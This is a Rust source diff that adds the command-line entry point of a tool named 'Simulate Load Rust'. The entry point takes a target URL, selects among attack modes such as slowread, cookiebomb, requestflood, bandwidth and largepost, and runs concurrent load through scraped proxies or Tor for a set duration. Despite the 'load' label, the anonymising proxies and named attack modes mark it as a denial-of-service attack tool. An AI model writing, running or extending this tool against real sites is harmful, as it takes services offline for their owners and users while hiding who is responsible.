@@ -621,6 +621,83 @@ async fn run_load(state: Arc<Mutex<AppState>>, pool: Arc<Mutex<ProxyPool>>) {
     }
 }
 
-fn main() {
-    println!("Simulate Load Rust - Ready.");
+#[tokio::main]
+async fn main() {
+    let args: Vec<String> = std::env::args().collect();
+    let target_url = args.get(1).map(|s| s.as_str()).unwrap_or(DEFAULT_TARGET_URL);
+    let mode_str = args.get(2).map(|s| s.as_str()).unwrap_or("scrape");
+    let attack_str = args.get(3).map(|s| s.as_str()).unwrap_or("normal");
+    let concurrency: usize = args.get(4).and_then(|s| s.parse().ok()).unwrap_or(20);
+    let duration_secs: u64 = args.get(5).and_then(|s| s.parse().ok()).unwrap_or(30);
+
+    println!("=== Simulate Load Rust ===");
+    println!("Target: {}", target_url);
+    println!("Mode: {} (proxy: {})", attack_str, mode_str);
+    println!("Concurrency: {}  Duration: {}s", concurrency, duration_secs);
+    println!("");
+
+    // Probe domain
+    let state = Arc::new(Mutex::new(AppState::new()));
+    state.lock().await.target_url = target_url.to_string();
+    state.lock().await.load_concurrency = concurrency;
+    state.lock().await.attack_mode = match attack_str {
+        "bandwidth" => AttackMode::Bandwidth,
+        "slowread" => AttackMode::SlowRead,
+        "imageopt" => AttackMode::ImageOpt,
+        "largepost" => AttackMode::LargePost,
+        "assetspray" => AttackMode::AssetSpray,
+        "rangereq" => AttackMode::RangeReq,
+        "cookiebomb" => AttackMode::CookieBomb,
+        "ssr" => AttackMode::SSR,
+        "middleware" => AttackMode::Middleware,
+        "requestflood" => AttackMode::RequestFlood,
+        "notfound" => AttackMode::NotFound,
+        _ => AttackMode::Normal,
+    };
+
+    match mode_str {
+        "tor" => state.lock().await.mode = ProxyMode::Tor,
+        "scrape-tor" => state.lock().await.mode = ProxyMode::ScrapeTorFallback,
+        _ => state.lock().await.mode = ProxyMode::Scrape,
+    }
+
+    println!("[1/3] Probing domain...");
+    probe_domain(target_url, &state).await;
+    let status = {
+        let st = state.lock().await;
+        st.probe_status.clone()
+    };
+    println!("  {}", status);
+    println!("");
+
+    // Get proxies
+    println!("[2/3] Acquiring proxies...");
+    let proxies = get_proxies(state.lock().await.mode, &state).await;
+    match proxies {
+        Some(prox_list) => {
+            println!("  Got {} proxies", prox_list.len());
+            let pool = Arc::new(Mutex::new(ProxyPool::new(&prox_list)));
+            println!("[3/3] Running load for {}s...", duration_secs);
+            state.lock().await.running = true;
+            let state_clone = state.clone();
+            let pool_clone = pool.clone();
+            tokio::spawn(run_load(state_clone, pool_clone));
+            tokio::time::sleep(Duration::from_secs(duration_secs)).await;
+            state.lock().await.running = false;
+            let final_stats = {
+                let st = state.lock().await;
+                format!(
+                    "Completed: {} req, {} bytes ({:.2} KB/s)",
+                    st.total_requests,
+                    st.total_bytes,
+                    st.total_bytes as f64 / duration_secs as f64 / 1024.0,
+                )
+            };
+            println!("  {}", final_stats);
+        }
+        None => {
+            eprintln!("  Failed to get proxies. Exiting.");
+            std::process::exit(1);
+        }
+    }
 }
